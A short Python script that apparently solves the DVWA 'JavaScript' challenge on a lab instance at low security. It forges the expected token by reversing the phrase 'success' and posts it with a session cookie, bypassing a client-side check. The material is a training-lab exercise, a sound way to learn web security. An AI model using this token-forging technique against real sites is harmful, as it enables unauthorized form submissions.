import requests

url = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/javascript/"
cookie = {
    "PHPSESSID": "ldi9n0nspgemlhdv38su5o9dt3",
    "security": "low"
}

phrase = "success"
token = phrase[::-1]  # 字符串反转

data = {
    "phrase": phrase,
    "token": token,
    "send": "Submit"
}

resp = requests.post(url, cookies=cookie, data=data)
print("token:", token)
print(resp.text)
